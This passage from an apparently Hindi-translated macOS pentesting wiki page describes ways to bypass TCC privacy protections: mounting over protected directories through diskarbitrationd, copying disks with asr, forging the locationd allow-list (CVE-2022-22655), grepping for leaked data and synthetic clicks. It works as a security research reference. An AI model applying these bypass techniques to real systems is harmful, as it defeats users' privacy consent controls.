सार्वजनिक `DiskArbitration` framework का फ़ंक्शन `DADiskMountWithArgumentsCommon` सुरक्षा जाँच करता था। हालाँकि, `diskarbitrationd` को सीधे कॉल करके इसे bypass करना संभव था, जिससे path में `../` elements और symlinks का इस्तेमाल किया जा सकता था।

इससे attacker किसी भी location पर arbitrary mounts कर सकता था, यहाँ तक कि `diskarbitrationd` के `com.apple.private.security.storage-exempt.heritable` entitlement के कारण TCC database के ऊपर भी mount कर सकता था।

### asr

टूल **`/usr/sbin/asr`** पूरे disk को copy करके किसी दूसरी जगह mount करने देता था, जिससे TCC protections bypass हो जाती थीं।

### CVE-2022-22655 - Location Services

Location Services, अन्य services की तरह TCC database में **नहीं** रखी जातीं। इन्हें `locationd` manage करता है, जो अपनी allow-list **`/var/db/locationd/clients.plist`** में रखता है:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Each entry client (bundle ID या executable path) से keyed होती है और इसमें `Authorized`, `BundleId`, `Executable` और `Registered` जैसे fields होते हैं।<sup>[[4]](#references)</sup>

`clients.plist` फ़ाइल स्वयं Sandbox/TCC द्वारा सुरक्षित है और इसे root के रूप में भी edit नहीं किया जा सकता — लेकिन **`/var/db/locationd/` directory को mount करने से सुरक्षित नहीं किया गया था**। इसलिए root के रूप में चल रहा attacker अपनी `clients.plist` वाली disk image बना सकता था (जिसमें उसका binary `Authorized` marked हो), उसे directory के ऊपर mount कर सकता था और forged allow-list को लागू करने के लिए `locationd` restart कर सकता था।<sup>[[3]](#references)</sup>

> [!TIP]
> यह ऊपर बताए गए `hdiutil`/`mount` TCC bypasses जैसा ही pattern है: *file* सुरक्षित है, लेकिन जिस *directory* में वह रखी है, वह नहीं; इसलिए file के बजाय पूरी directory replace कर दें।

## Startup apps के जरिए


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep के जरिए

कई मौकों पर files emails, phone numbers, messages... जैसी संवेदनशील जानकारी ऐसी जगहों पर store करती हैं जो सुरक्षित नहीं हैं (Apple में इसे vulnerability माना जाता है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

अब यह काम नहीं करता, लेकिन [**पहले करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करने का एक और तरीका:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework को bypass करना](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [संयोग और योजना से macOS TCC User Privacy Protections को bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (मूल रिपोर्ट)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego दुनिया में कहाँ है: macOS पर Location Services का दुरुपयोग](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass से iCloud का data चुराना](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD environment variables entitlement की अनुमति दें](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware में Zero-Day TCC bypass का पता चला](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "आपके Mac पर जो होता है, क्या वह Apple के iCloud तक ही रहता है?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [macOS की नई vulnerability, "powerdir," से unauthorized user data access हो सकता है](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory बदलें और TCC bypass करें, यानी CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Music चलाएँ और TCC bypass करें, यानी CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [एक (Fire)fox को कैसे लूटें](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS में Telegram के जरिए TCC bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerabilities का पता लगाना: diskarbitrationd और storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks और CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X पर environment variables set करना](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass और privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database के ऊपर mount करके TCC bypass करना](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS Privacy Mechanisms को bypass करने के 20+ तरीके](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC के खिलाफ Knockout जीत - MacOS Privacy Mechanisms को bypass करने के 20+ नए तरीके](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Spotlight से Apple Intelligence तक — macOS AI को चलाने वाला data चुराने के लिए 0day का दुरुपयोग](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
